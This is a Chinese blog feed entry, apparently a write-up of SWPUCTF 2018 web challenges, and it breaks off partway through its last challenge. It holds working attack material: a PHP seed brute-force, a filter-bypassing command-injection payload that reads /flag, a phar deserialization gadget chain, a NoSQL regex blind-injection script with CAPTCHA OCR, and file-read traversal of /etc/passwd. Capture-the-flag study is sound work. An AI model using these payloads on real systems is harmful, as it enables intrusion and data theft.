<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kir[A]</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://4f-kira.github.io/"/>
  <updated>2018-12-21T03:29:25.250Z</updated>
  <id>https://4f-kira.github.io/</id>
  
  <author>
    <name>kira</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>swpuctf2018</title>
    <link href="https://4f-kira.github.io/2018/12/20/swpuctf2018/"/>
    <id>https://4f-kira.github.io/2018/12/20/swpuctf2018/</id>
    <published>2018-12-20T03:11:03.000Z</published>
    <updated>2018-12-21T03:29:25.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="swpu2018"><a href="#swpu2018" class="headerlink" title="swpu2018"></a>swpu2018</h1><p>年底忙成狗，没什么时间，花了两个晚上的时间，做了一下简单的题目，还有些题目后面继续补。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码 买个 X ?"></a>用优惠码 买个 X ?</h3><p>注册一个账号，然后登陆，会弹出一个15位优惠码，在页面输入提醒优惠码为24位，扫描后发现源码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//生成优惠码</span></span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">'Auth'</span>, $auth);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据源码提示，需要爆破得到随机种子，然后生成24位优惠码，爆破脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;<span class="number">999999999</span>;$x++)&#123;</span><br><span class="line">    mt_srand($x);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($auth == <span class="string">'4d1Sb0qX2fy1FBV'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $x . <span class="string">"\n"</span>;        </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个效率太低，可以用<code>php_mt_seed</code>，首先将字符串还原为数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">s = <span class="string">'Lnnon15igXPrvif'</span></span><br><span class="line">num = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line"><span class="keyword">if</span> (i&lt;=(<span class="number">15</span>/<span class="number">2</span>)):</span><br><span class="line">num.append(str_rand.index(s[i]))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">num.append(str_rand[::<span class="number">-1</span>].index(s[i])+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'./php_mt_seed '</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num[:]:</span><br><span class="line">cmd += <span class="string">'&#123;&#125; &#123;&#125; 0 61 '</span>.format(i,i)</span><br><span class="line"><span class="keyword">print</span> cmd</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kira @ k1r4 in ~/pwn/swpu/php_mt_seed-4.0 [10:10:38] C:130</span></span><br><span class="line">$ ./php_mt_seed 47 47 0 61 13 13 0 61 13 13 0 61 14 14 0 61 13 13 0 61 27 27 0 61 31 31 0 61</span><br><span class="line">Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xfc000000 - 0xffffffff, speed 511.8 Mseeds/s</span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 0, trying 0x12000000 - 0x13ffffff, speed 40.4 Mseeds/s</span><br><span class="line">seed = 0x13af8864 = 330270820 (PHP 7.1.0+)</span><br><span class="line">Found 1, trying 0xfe000000 - 0xffffffff, speed 40.3 Mseeds/s</span><br><span class="line">Found 1</span><br></pre></td></tr></table></figure><p>然后根据随机数生成24位的验证码，即可到达命令执行的地方，虽然过滤了不少字符，不过很容易绕过</p><p>最后payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=0.0.0.0%0aca\t /fl\ag</span><br></pre></td></tr></table></figure><h3 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h3><p><code>file.php</code>可以看查看文件，得到php文件的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>function.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>; </span><br><span class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>; </span><br><span class="line">    <span class="comment">//mkdir("upload",0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>); </span><br><span class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用<code>phar</code>触发反序列化，触发过程如下：</p><ol><li><code>file_exists($file)</code>触发phar反序列化</li><li>触发<code>class C1e4r</code>的<code>__destruct()</code>，而函数中的<code>echo $this-&gt;test;</code>触发<code>class Show</code>中的<code>__toString()</code></li><li><code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source;</code>由于读取不可访问属性的值时，<code>class Test</code>中 <code>__get()</code> 会被调用。</li><li>最终调用<code>$this-&gt;get($key)</code>获取<code>$this-&gt;params[&#39;source&#39;]</code>的源码</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params[<span class="string">'source'</span>]= <span class="string">'/var/www/html/f1ag.php'</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line">$f = <span class="keyword">new</span> C1e4r($b);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub, 增加gif文件头，伪造文件类型</span></span><br><span class="line">$phar-&gt;setMetadata($f); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h3><p>扫描发现<code>info.php</code>发现是使用<code>mangodb</code>，那么可能就是<code>Nosql注入</code></p><p>自动识别验证码+盲注脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getvcode</span><span class="params">()</span>:</span></span><br><span class="line">url1 = <span class="string">'http://123.206.213.66:45678/vertify.php'</span></span><br><span class="line">pic = s.get(url1)</span><br><span class="line">p = open(<span class="string">'123.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line">p.write(pic.content)</span><br><span class="line">p.close()</span><br><span class="line">im = Image.open(<span class="string">'123.png'</span>)</span><br><span class="line">vcode = pytesseract.image_to_string(im)</span><br><span class="line"><span class="keyword">return</span> vcode</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">'http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^&#123;&#125;&amp;vertify=&#123;&#125;'</span></span><br><span class="line">pwd = <span class="string">''</span></span><br><span class="line"><span class="comment"># 'username or password incorrect!'</span></span><br><span class="line"><span class="comment"># 'wrong CAPTCHA!'</span></span><br><span class="line"><span class="comment"># 'Nice!But it is not the real passwd'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.lowercase:</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">vcode = getvcode()</span><br><span class="line">check = s.get(url2.format(pwd+x,vcode))</span><br><span class="line"><span class="keyword">print</span> check.content</span><br><span class="line"><span class="keyword">if</span> <span class="string">'wrong CAPTCHA!'</span> <span class="keyword">in</span> check.content:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'Nice!'</span> <span class="keyword">in</span> check.content:</span><br><span class="line">pwd += x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> pwd</span><br></pre></td></tr></table></figure><h3 id="皇家线上赌场"><a href="#皇家线上赌场" class="headerlink" title="皇家线上赌场"></a>皇家线上赌场</h3><p>打开页面发现了弹窗，查看网页源码，发现了一个文件包含<code>&lt;script src=&quot;/static?file=test.js&quot;&gt;&lt;/script&gt;</code></p><p>测试发现可以成功读取<code>http://107.167.188.241/static?file=/etc/passwd</code>，题目提示是python3.5写的，需要找到web目录。</p><p><code>view-source:http://107.167.188.241/source</code>发现了目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]<span class="comment"># tree web</span></span><br><span class="line">web/</span><br><span class="line">├── app</span><br><span class="line">│   ├── forms.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── models.py</span><br><span class="line">│   ├── static</span><br><span class="line">│   ├── templates</span><br><span class="line">│   ├── utils.py</span><br><span class="line">│   └── views.py</span><br><span class="line">├── req.txt</span><br><span class="line">├── run.py</span><br><span class="line">├── server.log</span><br><span class="line">├── start.sh</span><br><span class="line">└── uwsgi.ini</span><br><span class="line">[root@localhost]<span class="comment"># cat views.py.bak</span></span><br><span class="line">filename = request.args.get(<span class="string">'file'</span>, <span class="string">'test.js'</span>)</span><br><span class="line"><span class="keyword">if</span> filename.find(<span class="string">'..'</span>) != -1:</span><br><span class="line">    <span class="built_in">return</span> abort(403)</span><br><span class="line">filename = os.path.join(<span class="string">'app/static'</span>, filename)</span><br></pre></td></tr></table></figure><p>/proc/self/cmdline 可以看到启动命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --uid=ctf uwsgi.ini</span><br></pre></td></tr></table></figure></p><p>/proc/mounts 或者 /proc/self/maps 可以看到工作目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/ctf/web_assli3fasdf</span><br></pre></td></tr></table></figure></p><p>由于程序代码过滤<code>&lt;pre&gt; if filename != &#39;/home/ctf/web/app/static/test.js&#39; and filename.find(&#39;/home/ctf/web/app&#39;) != -1: return abort(404) 